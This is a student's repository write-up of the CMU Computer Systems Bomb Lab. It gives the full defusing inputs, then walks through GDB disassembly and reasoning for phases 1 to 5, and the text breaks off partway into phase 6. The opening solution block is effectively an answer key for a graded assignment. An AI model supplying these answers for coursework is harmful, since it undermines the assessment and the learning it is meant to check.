# system-labs
This repository hosts the detailed write-up of the select labs from my Computer Systems class. All are completed in their entirety with a detailed explanation. I will not be including the actual labs here to avoid copyright issues with CMU. They can all be accessed on [this page](http://csapp.cs.cmu.edu/3e/labs.html) with appropriate credentials. 

# Highlighted Labs for Computer Systems

In this entry, I offer a detailed walkthrough of my solutions for 3 of the CMU computer system labs:
* [Bomb Lab](./labs#bomb-lab) - a practice in using GDB to disassemble a compiled C program and solve increasingly more difficult challenges in order to prevent the bomb from exploding

* [Data Lab](./labs#data-lab) - an exercise in effective use of the lowest level functionality of the C programming language to manipulate data and compose more complex operations out of simpler ones

* [Attack Lab](./labs#attack-lab) - the challenge is to break the behavior of a program and execute unwanted code by manipulating the input in progressively more difficult 5 phases

Some of these labs were challenging and I needed to reference external material at times. Take a look at the [Bibliography](./labs#bibliography).


# Bomb Lab

Solution:

```
Border relations with Canada have never been better.
1 2 4 8 16 32
0 207
7 0 DrEvil
ionefg
4 3 2 1 6 5
20
```

Running the solution:

```
jupyter:~/my_bomblab/bomb$ ./bomb solution
Welcome to my fiendish little bomb. You have 6 phases with which to blow yourself up. Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
Good work!  On to the next...
Curses, you've found the secret phase!
But finding it and solving it are quite different...
Wow! You've defused the secret stage!
Congratulations! You've defused the bomb!
```

## Notes from objdump

- looks like the first part is definitions for system functions like printf, scanf... so skipping those for now
- _start seems to be calling something called __libc_start_main@plt so assuming that is also part of the system
- main seems to be reading the optional input file and then calling the phases in order, always followed by phase_defused
- next there are definitions for phases 1 - 3, then func4
- func4 is called from phase_4
- there are phases 4 - 6, fun7 and a secret_phase
- looks like the secret_phase is only called from the phase_defused function.
- there are some more functions that look like helper functions like read_six_numbers. I'll go through these as they come up in the phases.


## Phase 1
Dissassemble of phase_1:

```
(gdb) disassemble phase_1
Dump of assembler code for function phase_1:
0x0000000000400ee0 <+0>:     sub    $0x8,%rsp
0x0000000000400ee4 <+4>:     mov    $0x402400,%esi
0x0000000000400ee9 <+9>:     callq  0x401338 <strings_not_equal>
0x0000000000400eee <+14>:    test   %eax,%eax
0x0000000000400ef0 <+16>:    je     0x400ef7 <phase_1+23>
0x0000000000400ef2 <+18>:    callq  0x40143a <explode_bomb>
0x0000000000400ef7 <+23>:    add    $0x8,%rsp
0x0000000000400efb <+27>:    retq
```

On the second line, it looks like something is moved from memory into the register.

```
0x0000000000400ee4 <+4>:     mov    $0x402400,%esi
```

Examining what's at that address:

```
(gdb) x /s 0x402400
0x402400:       "Border relations with Canada have never been better."
```

strings_not_equal will set the %eax to 0x0 if the two strings it's checking are equal. We need this to happen for us to jump over the bomb call.

Using the string from 0x402400 as input successfully defuses phase_1.

## Phase 2
Dissassemble of phase_2:

```
(gdb) disassemble phase_2
    Dump of assembler code for function phase_2:
 => 0x0000000000400efc <+0>:     push   %rbp
    0x0000000000400efd <+1>:     push   %rbx --> rbx and rbp are pushed onto the stack
    0x0000000000400efe <+2>:     sub    $0x28,%rsp
    0x0000000000400f02 <+6>:     mov    %rsp,%rsi
    0x0000000000400f05 <+9>:     callq  0x40145c <read_six_numbers> --> from function name looks like the input should be 6 numbers
    0x0000000000400f0a <+14>:    cmpl   $0x1,(%rsp) --> after we return from read_six_numbers, value of rsp has to be 0x1 or we call the explode bomb
    0x0000000000400f0e <+18>:    je     0x400f30 <phase_2+52>
    0x0000000000400f10 <+20>:    callq  0x40143a <explode_bomb>
    0x0000000000400f15 <+25>:    jmp    0x400f30 <phase_2+52>
    0x0000000000400f17 <+27>:    mov    -0x4(%rbx),%eax
    0x0000000000400f1a <+30>:    add    %eax,%eax
    0x0000000000400f1c <+32>:    cmp    %eax,(%rbx) --> eax and rbx have to be equal or we trigger bomb
    0x0000000000400f1e <+34>:    je     0x400f25 <phase_2+41>
    0x0000000000400f20 <+36>:    callq  0x40143a <explode_bomb>
    0x0000000000400f25 <+41>:    add    $0x4,%rbx
    0x0000000000400f29 <+45>:    cmp    %rbp,%rbx
    0x0000000000400f2c <+48>:    jne    0x400f17 <phase_2+27> --> if rbp and rbx are different we jump back to +27
    0x0000000000400f2e <+50>:    jmp    0x400f3c <phase_2+64>
    0x0000000000400f30 <+52>:    lea    0x4(%rsp),%rbx
    0x0000000000400f35 <+57>:    lea    0x18(%rsp),%rbp
    0x0000000000400f3a <+62>:    jmp    0x400f17 <phase_2+27>
    0x0000000000400f3c <+64>:    add    $0x28,%rsp
    0x0000000000400f40 <+68>:    pop    %rbx
    0x0000000000400f41 <+69>:    pop    %rbp
    0x0000000000400f42 <+70>:    retq
```

Disassemble of read_six_numbers:

```
(gdb) disassemble read_six_numbers
    Dump of assembler code for function read_six_numbers:
 => 0x000000000040145c <+0>:     sub    $0x18,%rsp
    0x0000000000401460 <+4>:     mov    %rsi,%rdx
    0x0000000000401463 <+7>:     lea    0x4(%rsi),%rcx
    0x0000000000401467 <+11>:    lea    0x14(%rsi),%rax
    0x000000000040146b <+15>:    mov    %rax,0x8(%rsp)
    0x0000000000401470 <+20>:    lea    0x10(%rsi),%rax
    0x0000000000401474 <+24>:    mov    %rax,(%rsp)
    0x0000000000401478 <+28>:    lea    0xc(%rsi),%r9
    0x000000000040147c <+32>:    lea    0x8(%rsi),%r8
    0x0000000000401480 <+36>:    mov    $0x4025c3,%esi --> here we're putting something from an address in memory into esi
    0x0000000000401485 <+41>:    mov    $0x0,%eax
    0x000000000040148a <+46>:    callq  0x400bf0 <__isoc99_sscanf@plt>
    0x000000000040148f <+51>:    cmp    $0x5,%eax
    0x0000000000401492 <+54>:    jg     0x401499 <read_six_numbers+61>
    0x0000000000401494 <+56>:    callq  0x40143a <explode_bomb>
    0x0000000000401499 <+61>:    add    $0x18,%rsp
    0x000000000040149d <+65>:    retq
```

At read_six_numbers + 36, we're putting something from memory into a register, similar to phase_1. Let's see what's there in memory:

```
(gdb) x /d 0x4025c3
0x4025c3:       622879781
(gdb) x /s 0x4025c3
0x4025c3:       "%d %d %d %d %d %d"
```

This looks like the input format string. We're looking for 6 integers separated with spaces.

Running the program with "0 1 2 3 4 5" input.

After the sscanf function, a literal 5 is compared to %eax. If value in %eax is greater than 5, we will skip the bomb.
Examining the registers shows that %rax holds 0x6, so it's safe to step through.
We safely skipped the bomb and returned to phase_2 after the read_six_numbers call.

We are now comparing a literal 1 to whatever is in %rsp and they have to be equal for us to jump over the bomb.
Looks like the value of the address stored in %rsp is 0, so continuing would trigger the bomb.
0 was the first integer I gave as input, so I'm going to kill the program and run it again with "1 2 3 4 5 6" as input.

Stopping at the same point, now rsp's address does hold 1. That means we will jump through to phase_2+52.

On line:

```
    0x0000000000400f30 <+52>:    lea    0x4(%rsp) %rbx
```
we're loading the effective address at %rsp + 4 bytes into %rbx.

Examining the address at rbx and the following addresses in memory in 4byte increments:

```
(gdb) x /d 0x7fffffffe1d0
0x7fffffffe1d0: 1
(gdb) x /d 0x7fffffffe1d4
0x7fffffffe1d4: 2
(gdb) x /d 0x7fffffffe1d8
0x7fffffffe1d8: 3
(gdb) x /d 0x7fffffffe1dc
0x7fffffffe1dc: 4
(gdb) x /d 0x7fffffffe1e0
0x7fffffffe1e0: 5
(gdb) x /d 0x7fffffffe1e4
0x7fffffffe1e4: 6
```
We now know where all our input values are!

Jumping back to phase_2+27 : 

```
0x400f17 <phase_2+27>:       mov    -0x4(%rbx),%eax
```

The address stored in %rbx - 4 bytes is being moved into %eax.

Examining %eax after this instruction executes, we can see that 0x1 (our first input value) is now in %eax.

The next line adds %eax to itself, so %eax now holds 2.

%eax is then compared with what the address at %rbx holds and these have to equal for us to jump over the bomb.

We can see from the output above that (%rbx) now holds 2. It's safe to step through for now.

After we jump over the bomb, 0x4 is added to %rbx, which means our next value (3) is now in the address at %rbx.

%rbp and %rbx are now compared, and looking at the registers, they are equal.

This means we will jump to phase_2+27.

```
=> 0x400f17 <phase_2+27>:       mov    -0x4(%rbx),%eax
```

We are moving the previous value into %eax. We know (%rbx) holds 3, so the value moved into %eax must be 2.

```
=> 0x400f1a <phase_2+30>:       add    %eax,%eax
```

%eax is then added to itself, producing 4.

```
=> 0x400f1c <phase_2+32>:       cmp    %eax,(%rbx)
```

%eax is 4 and (%rbp) is 3, and we need these to be equal to skip the bomb. 

It now looks like the solution might be a geometric sequence 1 2 4 8 16 32... so I'm going to kill the program and try again with that input.

With our geometric sequence "1 2 4 8 16 32", phase_2 is defused.

## Phase 3

Dissasemble of phase_3:

```
    Breakpoint 1, 0x0000000000400f43 in phase_3 ()
    (gdb) disassemble phase_3
    Dump of assembler code for function phase_3:
 => 0x0000000000400f43 <+0>:     sub    $0x18,%rsp
    0x0000000000400f47 <+4>:     lea    0xc(%rsp),%rcx
    0x0000000000400f4c <+9>:     lea    0x8(%rsp),%rdx
    0x0000000000400f51 <+14>:    mov    $0x4025cf,%esi
    0x0000000000400f56 <+19>:    mov    $0x0,%eax
    0x0000000000400f5b <+24>:    callq  0x400bf0 <__isoc99_sscanf@plt> --> from what we learned in read_six_numbers, after sscanf, %eax will hold the number of arguments passed in
    0x0000000000400f60 <+29>:    cmp    $0x1,%eax --> we have to have more than 1 argument to skip over the bomb.
    0x0000000000400f63 <+32>:    jg     0x400f6a <phase_3+39>
    0x0000000000400f65 <+34>:    callq  0x40143a <explode_bomb>
    0x0000000000400f6a <+39>:    cmpl   $0x7,0x8(%rsp)
    0x0000000000400f6f <+44>:    ja     0x400fad <phase_3+106>
    0x0000000000400f71 <+46>:    mov    0x8(%rsp),%eax
    0x0000000000400f75 <+50>:    jmpq   *0x402470(,%rax,8)
    0x0000000000400f7c <+57>:    mov    $0xcf,%eax
    0x0000000000400f81 <+62>:    jmp    0x400fbe <phase_3+123>
    0x0000000000400f83 <+64>:    mov    $0x2c3,%eax
    0x0000000000400f88 <+69>:    jmp    0x400fbe <phase_3+123>
    0x0000000000400f8a <+71>:    mov    $0x100,%eax
    0x0000000000400f8f <+76>:    jmp    0x400fbe <phase_3+123>
    0x0000000000400f91 <+78>:    mov    $0x185,%eax
    0x0000000000400f96 <+83>:    jmp    0x400fbe <phase_3+123>
    0x0000000000400f98 <+85>:    mov    $0xce,%eax
    0x0000000000400f9d <+90>:    jmp    0x400fbe <phase_3+123>
    0x0000000000400f9f <+92>:    mov    $0x2aa,%eax
    0x0000000000400fa4 <+97>:    jmp    0x400fbe <phase_3+123>
    0x0000000000400fa6 <+99>:    mov    $0x147,%eax
    0x0000000000400fab <+104>:   jmp    0x400fbe <phase_3+123>
    0x0000000000400fad <+106>:   callq  0x40143a <explode_bomb>
    0x0000000000400fb2 <+111>:   mov    $0x0,%eax
    0x0000000000400fb7 <+116>:   jmp    0x400fbe <phase_3+123>
    0x0000000000400fb9 <+118>:   mov    $0x137,%eax
    0x0000000000400fbe <+123>:   cmp    0xc(%rsp),%eax
    0x0000000000400fc2 <+127>:   je     0x400fc9 <phase_3+134>
    0x0000000000400fc4 <+129>:   callq  0x40143a <explode_bomb>
    0x0000000000400fc9 <+134>:   add    $0x18,%rsp
    0x0000000000400fcd <+138>:   retq
```

Similar to phase_2, we have:

```
0x0000000000400f51 <+14>:    mov    $0x4025cf,%esi
```

Which means something from a specific address in memory is being moved into %esi.

Examining the memory:

```
(gdb) x /s 0x4025cf
0x4025cf:       "%d %d"
```

So looks like the input is formated to take in 2 integers separated by a space.

Killing the program and starting again with input "0 1" for phase_3

We successfully jumped over the bomb. Next line is:

```
=> 0x400f6a <phase_3+39>:       cmpl   $0x7,0x8(%rsp) --> comparing a literal 7 to the value of the address in %rsp + 1 byte
```

```
(gdb) x /d 0x7fffffffe1f0
0x7fffffffe1f0: -8
(gdb) x /d 0x7fffffffe1f8
0x7fffffffe1f8: 0
```

Right now (%rsp) holds -8 and 0x8(%rsp) holds 0.
    
Next line is:

```
=> 0x400f6f <phase_3+44>:       ja     0x400fad <phase_3+106>
```

ja is the jg for unsigned, so we're going to jump over the bomb if 0x8(%rsp) is greater than 7, which it is not.

This is good because jumping to phase_3+106 would trigger the bomb. 

Looks like the first integer should be less than 7.
Moving on:

```
=> 0x400f71 <phase_3+46>:       mov    0x8(%rsp),%eax --> our value (0) is moved into %eax
=> 0x400f75 <phase_3+50>:       jmpq   *0x402470(,%rax,8)
```

The disassembled code below this line looks like a switch statement, and all of the branches jump to the same place: phase_3+123

Continuing forward:

```
=> 0x400f7c <phase_3+57>:       mov    $0xcf,%eax --> 0xcf is moved into %eax
=> 0x400f81 <phase_3+62>:       jmp    0x400fbe <phase_3+123> --> we're jumping over the rest of the cases:
=> 0x400fbe <phase_3+123>:      cmp    0xc(%rsp),%eax --> %eax is compared to 0xc(%rsp) and if they're equal we'll jump over the bomb
```

Looking at 0xc(%rsp):

```
(gdb) x /d 0x7fffffffe1fc
0x7fffffffe1fc: 1 --> It's our second value! And we know it must equal 0xcf = 207.
```

Killing the program and trying again with "0 207".

This defuses phase_3.

## Phase 4

Disassemble of phase_4:

```
    (gdb) disassemble phase_4
    Dump of assembler code for function phase_4:
 => 0x000000000040100c <+0>:     sub    $0x18,%rsp
    0x0000000000401010 <+4>:     lea    0xc(%rsp),%rcx
    0x0000000000401015 <+9>:     lea    0x8(%rsp),%rdx
    0x000000000040101a <+14>:    mov    $0x4025cf,%esi
    0x000000000040101f <+19>:    mov    $0x0,%eax
    0x0000000000401024 <+24>:    callq  0x400bf0 <__isoc99_sscanf@plt>
    0x0000000000401029 <+29>:    cmp    $0x2,%eax
    0x000000000040102c <+32>:    jne    0x401035 <phase_4+41>
    0x000000000040102e <+34>:    cmpl   $0xe,0x8(%rsp)
    0x0000000000401033 <+39>:    jbe    0x40103a <phase_4+46>
    0x0000000000401035 <+41>:    callq  0x40143a <explode_bomb>
    0x000000000040103a <+46>:    mov    $0xe,%edx
    0x000000000040103f <+51>:    mov    $0x0,%esi
    0x0000000000401044 <+56>:    mov    0x8(%rsp),%edi
    0x0000000000401048 <+60>:    callq  0x400fce <func4>
    0x000000000040104d <+65>:    test   %eax,%eax
    0x000000000040104f <+67>:    jne    0x401058 <phase_4+76>
    0x0000000000401051 <+69>:    cmpl   $0x0,0xc(%rsp)
    0x0000000000401056 <+74>:    je     0x40105d <phase_4+81>
    0x0000000000401058 <+76>:    callq  0x40143a <explode_bomb>
    0x000000000040105d <+81>:    add    $0x18,%rsp
    0x0000000000401061 <+85>:    retq
```

Looks like there is a call to func4, so let's disassemble that as well:

```
    (gdb) disassemble func4
    Dump of assembler code for function func4:
    0x0000000000400fce <+0>:     sub    $0x8,%rsp
    0x0000000000400fd2 <+4>:     mov    %edx,%eax
    0x0000000000400fd4 <+6>:     sub    %esi,%eax
    0x0000000000400fd6 <+8>:     mov    %eax,%ecx
    0x0000000000400fd8 <+10>:    shr    $0x1f,%ecx
    0x0000000000400fdb <+13>:    add    %ecx,%eax
    0x0000000000400fdd <+15>:    sar    %eax
    0x0000000000400fdf <+17>:    lea    (%rax,%rsi,1),%ecx
    0x0000000000400fe2 <+20>:    cmp    %edi,%ecx
    0x0000000000400fe4 <+22>:    jle    0x400ff2 <func4+36>
    0x0000000000400fe6 <+24>:    lea    -0x1(%rcx),%edx
    0x0000000000400fe9 <+27>:    callq  0x400fce <func4>
    0x0000000000400fee <+32>:    add    %eax,%eax
    0x0000000000400ff0 <+34>:    jmp    0x401007 <func4+57>
    0x0000000000400ff2 <+36>:    mov    $0x0,%eax
    0x0000000000400ff7 <+41>:    cmp    %edi,%ecx
    0x0000000000400ff9 <+43>:    jge    0x401007 <func4+57>
    0x0000000000400ffb <+45>:    lea    0x1(%rcx),%esi
    0x0000000000400ffe <+48>:    callq  0x400fce <func4>
    0x0000000000401003 <+53>:    lea    0x1(%rax,%rax,1),%eax
    0x0000000000401007 <+57>:    add    $0x8,%rsp
    0x000000000040100b <+61>:    retq
```

It looks like there is a similar pattern to previous phases at line:

```
0x000000000040101a <+14>:    mov    $0x4025cf,%esi
```

So let's see what's there in memory:

```
(gdb) x /s 0x4025cf
0x4025cf:       "%d %d"
```

Looks like our input format is the same in phase_4 as it was in phase_3.

Killing the program and running agian with input "0 1".

Stepping through, after we exit the sscanf:

```
=> 0x401029 <phase_4+29>:       cmp    $0x2,%eax --> a literal 2 is compared to %eax
```

Examining the registers, %eax does hold 2 (probably because we gave 2 inputs)

This means we are not going to jump to the bomb at phase_4+41 so we can safely step through.

```
=> 0x40102e <phase_4+34>:       cmpl   $0xe,0x8(%rsp) --> comparing a literal 0xe (14) to the value at address in %rsp + 8
```

```
(gdb) x /d 0x7fffffffe1f8
0x7fffffffe1f8: 0 --> this is our first input
```

Next line is jbe, so we will need a value <= 14 as our first input to skip over the bomb here.

Killing the program and re-starting with input "14 15"

This safely skips over the bomb and leads us to phase_4+46.

In the next 3 lines:

- 0xe (14) is moved into %edx
- 0x0 (0) is moved into  %esi
- the address that holds our first input is moved into %edi

Then func4 is called.

```
=> 0x400fce <func4>:    sub    $0x8,%rsp --> 8 is subtracted from %rsp. (stack re-alignment)
```

After this line is executed, address at %rsp holds 16. Not sure where this came from since our input was "14 15", could be random data.

```
=> 0x400fd2 <func4+4>:  mov    %edx,%eax --> %edx moved to %eax. %eax = 14
=> 0x400fd4 <func4+6>:  sub    %esi,%eax --> %eax = 14 - 0 = 14
=> 0x400fd6 <func4+8>:  mov    %eax,%ecx --> %ecx = 14
=> 0x400fd8 <func4+10>: shr    $0x1f,%ecx --> %ecx is shifted right by 31. so 14 >> 31, %ecx = 0
=> 0x400fdb <func4+13>: add    %ecx,%eax --> %eax = 14 + 0 = 14
=> 0x400fdd <func4+15>: sar    %eax --> this is a Shift Arithmetic Right, so 14 >> 1 = 7
=> 0x400fdf <func4+17>: lea    (%rax,%rsi,1),%ecx --> %ecx = 7 + 0 * 1 = 7
```

Now we have a comparison again:

```
=> 0x400fe2 <func4+20>: cmp    %edi,%ecx
```

%edi, which holds our first input (14) is compared to %ecx which now holds 7

Since 7 is <= than 14, we will jump over to func4+36.

```
=> 0x400ff2 <func4+36>: mov    $0x0,%eax --> %eax = 0
=> 0x400ff7 <func4+41>: cmp    %edi,%ecx --> comparing %edi(14) with %ecx(7)
=> 0x400ffb <func4+45>: lea    0x1(%rcx),%esi --> %esi = %rcx + 1 = 8
=> 0x400ffe <func4+48>: callq  0x400fce <func4> --> going back to top of func4. Recursion?
```

Continuing the function and looking further:

```
=> 0x40104d <phase_4+65>:       test   %eax,%eax
=> 0x40104f <phase_4+67>:       jne    0x401058 <phase_4+76> --> will jump to +76 if %eax != 0 : https://en.wikipedia.org/wiki/TEST_(x86_instruction)
```

Right now our %eax is 7 so we will jump to the bomb.
This means our first input of 14 is wrong.

Looking at func4, it looks like we need to hit both jumps at:

```
0x0000000000400fe2 <+20>:    cmp    %edi,%ecx
0x0000000000400fe4 <+22>:    jle    0x400ff2 <func4+36>
```
and 

```
0x0000000000400ff2 <+36>:    mov    $0x0,%eax
0x0000000000400ff7 <+41>:    cmp    %edi,%ecx
0x0000000000400ff9 <+43>:    jge    0x401007 <func4+57>
```

Notice on +36 that if we hit both these jumps, %eax will also be set to 0, which is what we are looking for right after returning from func4
    
%edi holds our first input, so we need a number that's going to be <= 7 for the comparison on +20
and that's going to be >= 7 for the comparison on +41.

We can try 7 as first input, since it also fits the earlier condition of being <= 14.

Killing the program and trying with input "7 15".

We successfully exit func4 and skip the jump to the bomb in phase_4+69.

Next line: 

```
=> 0x401051 <phase_4+69>:       cmpl   $0x0,0xc(%rsp) --> a literal 0 is compared with 0xc(%rsp), which:
(gdb) x /d $rsp + 0xc
0x7fffffffe1fc: 15 --> holds our second input.
```
Looking ahead, in order to jump over the bomb call, we need these to be equal.

Killing the program and trying "7 0" as input.

That defuses phase_4.


## Phase 5

Disassemble of phase_5:

```
    (gdb) disassemble phase_5
    Dump of assembler code for function phase_5:
 => 0x0000000000401062 <+0>:     push   %rbx
    0x0000000000401063 <+1>:     sub    $0x20,%rsp
    0x0000000000401067 <+5>:     mov    %rdi,%rbx
    0x000000000040106a <+8>:     mov    %fs:0x28,%rax
    0x0000000000401073 <+17>:    mov    %rax,0x18(%rsp)
    0x0000000000401078 <+22>:    xor    %eax,%eax
    0x000000000040107a <+24>:    callq  0x40131b <string_length>
    0x000000000040107f <+29>:    cmp    $0x6,%eax
    0x0000000000401082 <+32>:    je     0x4010d2 <phase_5+112>
    0x0000000000401084 <+34>:    callq  0x40143a <explode_bomb>
    0x0000000000401089 <+39>:    jmp    0x4010d2 <phase_5+112>
    0x000000000040108b <+41>:    movzbl (%rbx,%rax,1),%ecx
    0x000000000040108f <+45>:    mov    %cl,(%rsp)
    0x0000000000401092 <+48>:    mov    (%rsp),%rdx
    0x0000000000401096 <+52>:    and    $0xf,%edx
    0x0000000000401099 <+55>:    movzbl 0x4024b0(%rdx),%edx
    0x00000000004010a0 <+62>:    mov    %dl,0x10(%rsp,%rax,1)
    0x00000000004010a4 <+66>:    add    $0x1,%rax
    0x00000000004010a8 <+70>:    cmp    $0x6,%rax
    0x00000000004010ac <+74>:    jne    0x40108b <phase_5+41>
    0x00000000004010ae <+76>:    movb   $0x0,0x16(%rsp)
    0x00000000004010b3 <+81>:    mov    $0x40245e,%esi
    0x00000000004010b8 <+86>:    lea    0x10(%rsp),%rdi
    0x00000000004010bd <+91>:    callq  0x401338 <strings_not_equal>
    0x00000000004010c2 <+96>:    test   %eax,%eax
    0x00000000004010c4 <+98>:    je     0x4010d9 <phase_5+119>
    0x00000000004010c6 <+100>:   callq  0x40143a <explode_bomb>
    0x00000000004010cb <+105>:   nopl   0x0(%rax,%rax,1)
    0x00000000004010d0 <+110>:   jmp    0x4010d9 <phase_5+119>
    0x00000000004010d2 <+112>:   mov    $0x0,%eax
    0x00000000004010d7 <+117>:   jmp    0x40108b <phase_5+41>
    0x00000000004010d9 <+119>:   mov    0x18(%rsp),%rax
    0x00000000004010de <+124>:   xor    %fs:0x28,%rax
    0x00000000004010e7 <+133>:   je     0x4010ee <phase_5+140>
    0x00000000004010e9 <+135>:   callq  0x400b30 <__stack_chk_fail@plt>
    0x00000000004010ee <+140>:   add    $0x20,%rsp
    0x00000000004010f2 <+144>:   pop    %rbx
    0x00000000004010f3 <+145>:   retq
```

Running phase_5 with input "input string".

Looking through the disassemble, we move some stuff around and then string_length is called, after which we have a comparison of %eax and a literal 6:

```
=> 0x40107f <phase_5+29>:       cmp    $0x6,%eax
```

Checking %rax, it currently holds 12, which is the length out our "input string".

This means the length of our input string has to be exactly 6 in order to jump over the bomb.

Killing the program and running agian with "length" as input:

Stepping through, we successfully jump over the boms to phase_5 + 112.

%eax is then set to 0 and we jump back to phase_5 + 41.

```
=> 0x40108b <phase_5+41>:       movzbl (%rbx,%rax,1),%ecx
```

%rbx holds our input "length". 0 * 1 is added to it, so it should be unchanged.

So whatever value is at address "length" (in hex )

movzbl : The difference is that z makes the byte extension add leading zeroes. [bibliography reference 0]

The address at %rbx holds the value "length":

```
(gdb) p /x "length"
$5 = {0x6c, 0x65, 0x6e, 0x67, 0x74, 0x68, 0x0}
```

So the byte 0x6c ('l') will be extended to 32 bits with leading zeroes and that value will be put into %ecx.

Therefore 0x6c will be put into %ecx (first letter of our input string)

```
=> 0x40108f <phase_5+45>:       mov    %cl,(%rsp) --> %cl (low byte of %ecx) = 0x6c is put into the address at %rsp.
=> 0x401092 <phase_5+48>:       mov    (%rsp),%rdx --> 0x6c is moved into %rdx
=> 0x401096 <phase_5+52>:       and    $0xf,%edx --> the and operation with 0xf means only the last 4 bits will be preserved.
```

%rdx now holds 0xc.

```
=> 0x401099 <phase_5+55>:       movzbl 0x4024b0(%rdx),%edx --> %rdx is now overwritten by whatever is at address 0x4024b0 + 0xc
```

Let's see what's there and in the addresses nearby, since the 0xc came from our input of "l" so there might be other relevant values nearby.

```
(gdb) x /x 0x4024b0 + 0
0x4024b0 <array.3449>:  0x6d

(gdb) x /s 0x4024b0 + 0
0x4024b0 <array.3449>:  "maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"

(gdb) x /s 0x4024b0 + 4
0x4024b4 <array.3449+4>:        "iersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"

(gdb) x /s 0x4024b0 + 8
0x4024b8 <array.3449+8>:        "nfotvbylSo you think you can stop the bomb with ctrl-c, do you?"

(gdb) x /s 0x4024b0 + 0xc
0x4024bc <array.3449+12>:       "vbylSo you think you can stop the bomb with ctrl-c, do you?"

(gdb) x /s 0x4024b0 + 0xf
0x4024bf <array.3449+15>:       "lSo you think you can stop the bomb with ctrl-c, do you?"
```

This is interesting. Since only the last 4 bits of the first letter of our input are preserved, the closest we can get to the start of this sentence is 0x4024b0 + 0xf, which leaves a char in front.

I'm thinking the bomb creators might just be funny here, since "ctrl-c" is a 6-char string and might just be the answer.

Killing the program and running with "ctrl-c" input. Putting a breakpoint on explode_bomb just to be safe.

That didn't work.
    
Continuing where I left off with "length" as input just to be able to follow what happens more easily.

```
=> 0x4010a0 <phase_5+62>:       mov    %dl,0x10(%rsp,%rax,1) --> low byte of %rdx (0x76) is stored in address at rsp + 0 * 1 + 0x10.
=> 0x4010a4 <phase_5+66>:       add    $0x1,%rax --> %rax is now 1 (it was 0)
=> 0x4010a8 <phase_5+70>:       cmp    $0x6,%rax --> 6 is compared to %rax
```

Since they're not equal, we'll jump back to phase_5 + 41.

Because %rax was incremented, this line:

```
=> 0x40108b <phase_5+41>:       movzbl (%rbx,%rax,1),%ecx --> will load the next letter of our input ('e' = 0x65) into %ecx
```

This value is then and-ed with 0xf, so only 0x5 is is left in %rdx.

```
=> 0x401099 <phase_5+55>:       movzbl 0x4024b0(%rdx),%edx
```

```
(gdb) x /s 0x4024b5
0x4024b5 <array.3449+5>:        "ersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"
```

So the letter 'e' (0x65) is moved into %rdx. I think this happens to be 'e' and has nothing to do with our input being 'e'.

```
=> 0x4010a0 <phase_5+62>:       mov    %dl,0x10(%rsp,%rax,1) --> this value is then moved onto the stack with an offset since rax is now 1
```

And we go on to increment %rax and loop back. Since the comparison is 6, it looks like this loop will be executed for each letter of our input before we can move on.

It looks like:

- the 4 last bits are taken from each byte of our input
- this value is then used to grab a char from the array 0x4024b0 <array.3449>:  "maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"
- the grabbed char is then stored on the stack

Putting a breakpoint at phase_5 + 76 to skip through the looping and continue with the function:

```
=> 0x4010ae <phase_5+76>:       movb   $0x0,0x16(%rsp)
```

We exited the loop and 0x0 is being moved onto the stack with an offset of 0x16. 

The usual offset when we were storing the grabbed chars was 0x10, so this is probably to add an 0x00 at the end of the chars we grabbed so 0x10(%rsp) will form a 6-long string.

Let's run the instruction and see what we stored in 0x10(%rsp):

```
(gdb) x /s $rsp + 0x10
0x7fffffffe1f0: "veysin"
```

"veysin" doesn't mean anything but it is all letters grabbed from the array: "madu(4: i)(1: e)r(3: s)(5: n)fot(0: v)b(2: y)lSo you think..."

```
=> 0x4010b3 <phase_5+81>:       mov    $0x40245e,%esi -> something from memory

(gdb) x /s 0x40245e
0x40245e:       "flyers"

=> 0x4010b8 <phase_5+86>:       lea    0x10(%rsp),%rdi
```

The pointer to string "flyers" is moved into %esi

The pointer to our string "veysin" is moved into %rdi

strings_not_equal is then called, which I'm assuming will set %eax to something, given the 2 input strings in %esi and %rdi

skipping until strings_not_equal is done:

```
=> 0x4010c2 <phase_5+96>:       test   %eax,%eax -->%eax is currently 0x1
=> 0x4010c4 <phase_5+98>:       je     0x4010d9 <phase_5+119>
```

We need %eax to be 0 for the jump to happen. [bibliography reference 1]
    
We need the jump to happen so we can skip the bomb.

So we need to grab "flyers" in that order from this array:

```
0x4024b0 <array.3449>:  "maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"

    f : +9  --> +0x9
    l : +15 --> +0xf
    y : +14 --> +0xe
    e : +5  --> +0x5
    r : +6  --> +0x6
    s : +7  --> +0x7
```
    
Since the second 4 bits of each char in our input string are the input for selecting from the array:

```
0x?9:   0x29,   0x39,   0x49,   0x59,   0x69,   0x79
        ),      9,      I,      Y,      i,      y  
Note: looks like there will be many combinations of valid inputs so I'm just going to look at the lowercase letter in the ascii table to save time:
0x?f:   0x6f = o
0x?e:   0x6e = n
0x?5:   0x65 = e
0x?6:   0x66 = f
0x?7:   0x67 = g
```

So "ionefg" should be a valid input.

Killing the program and running with "ionefg" while keeping a breakpoint at explode_bomb to check.

That solves phase_5.


## Phase 6

Disassemble of phase_6

```
    (gdb) disassemble phase_6
    Dump of assembler code for function phase_6:
 => 0x00000000004010f4 <+0>:     push   %r14
    0x00000000004010f6 <+2>:     push   %r13
    0x00000000004010f8 <+4>:     push   %r12
    0x00000000004010fa <+6>:     push   %rbp
    0x00000000004010fb <+7>:     push   %rbx
    0x00000000004010fc <+8>:     sub    $0x50,%rsp
    0x0000000000401100 <+12>:    mov    %rsp,%r13
    0x0000000000401103 <+15>:    mov    %rsp,%rsi
    0x0000000000401106 <+18>:    callq  0x40145c <read_six_numbers>
    0x000000000040110b <+23>:    mov    %rsp,%r14
    0x000000000040110e <+26>:    mov    $0x0,%r12d
    0x0000000000401114 <+32>:    mov    %r13,%rbp
    0x0000000000401117 <+35>:    mov    0x0(%r13),%eax
    0x000000000040111b <+39>:    sub    $0x1,%eax
    0x000000000040111e <+42>:    cmp    $0x5,%eax
    0x0000000000401121 <+45>:    jbe    0x401128 <phase_6+52>
    0x0000000000401123 <+47>:    callq  0x40143a <explode_bomb>
    0x0000000000401128 <+52>:    add    $0x1,%r12d
    0x000000000040112c <+56>:    cmp    $0x6,%r12d
    0x0000000000401130 <+60>:    je     0x401153 <phase_6+95>
    0x0000000000401132 <+62>:    mov    %r12d,%ebx
    0x0000000000401135 <+65>:    movslq %ebx,%rax
